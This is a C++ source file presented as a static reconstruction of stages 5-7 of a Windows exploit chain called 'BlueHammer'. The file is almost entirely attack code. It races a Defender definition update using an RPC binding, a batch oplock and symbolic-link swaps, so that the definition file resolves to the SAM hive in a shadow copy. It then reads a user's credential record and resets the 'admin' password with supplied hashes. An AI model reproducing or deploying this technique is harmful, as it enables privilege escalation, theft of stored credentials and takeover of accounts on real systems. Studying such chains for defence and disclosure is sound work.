// Static reconstruction of Qualys BlueHammer Stages 5-7; not a runnable PoC.
// The harness supplies initialized native object attributes, offline-registry
// handles and the old/new NT hashes recovered/computed in Stage 7.
#include <windows.h>
#include <winternl.h>
#include <rpc.h>
extern "C" long NtCreateSymbolicLinkObject(HANDLE*, ULONG, OBJECT_ATTRIBUTES*, UNICODE_STRING*);
extern "C" long OROpenHiveByHandle(HANDLE, HANDLE*);
extern "C" long OROpenKey(HANDLE, const wchar_t*, HANDLE*);
extern "C" long ORGetValue(HANDLE, const wchar_t*, const wchar_t*, DWORD*, void*, DWORD*);
extern "C" long SamiChangePasswordUser(const wchar_t*, const void*, const void*);
void update_race(HANDLE staged, HANDLE old_link, OBJECT_ATTRIBUTES* alias,
                 OBJECT_ATTRIBUTES* file_alias, HANDLE transaction,
                 const void* old_hash, const void* new_hash) {
    RPC_WSTR binding_text = nullptr;
    RPC_BINDING_HANDLE binding = nullptr;
    RpcStringBindingComposeW((RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839",
        (RPC_WSTR)L"ncalrpc", nullptr,
        (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", nullptr, &binding_text);
    RpcBindingFromStringBindingW(binding_text, &binding);
    // The MIDL procedure-42 worker is already opening the staged definition.
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    DWORD transferred = 0;
    DeviceIoControl(staged, FSCTL_REQUEST_BATCH_OPLOCK, nullptr, 0, nullptr, 0, &transferred, &ov);
    GetOverlappedResult(staged, &ov, &transferred, TRUE);
    CloseHandle(old_link);
    UNICODE_STRING directory, sam;
    RtlInitUnicodeString(&directory, L"\\Sessions\\2\\BaseNamedObjects\\{11111111-2222-3333-4444-555555555555}");
    RtlInitUnicodeString(&sam, L"\\??\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM");
    UNICODE_STRING update_name;
    RtlInitUnicodeString(&update_name, L"WDUpdateDirectory");
    alias->ObjectName = &update_name;
    HANDLE link, sam_link;
    NtCreateSymbolicLinkObject(&link, 0x10000000, alias, &directory);
    UNICODE_STRING definition_name;
    RtlInitUnicodeString(&definition_name, L"mpasbase.vdm");
    file_alias->ObjectName = &definition_name;
    NtCreateSymbolicLinkObject(&sam_link, 0x10000000, file_alias, &sam);
    CloseHandle(staged);
    HANDLE leaked = CreateFileTransactedW(L"C:\\staging\\mpasbase.vdm", GENERIC_READ,
        FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr, transaction, nullptr, nullptr);
    HANDLE hive, user;
    OROpenHiveByHandle(leaked, &hive);
    OROpenKey(hive, L"SAM\\Domains\\Account\\Users\\000003E9", &user);
    BYTE record[4096]; DWORD length = sizeof(record), type;
    ORGetValue(user, nullptr, L"V", &type, record, &length);
    // Hash decryption and new-hash computation are outside this excerpt.
    SamiChangePasswordUser(L"admin", old_hash, new_hash);
}
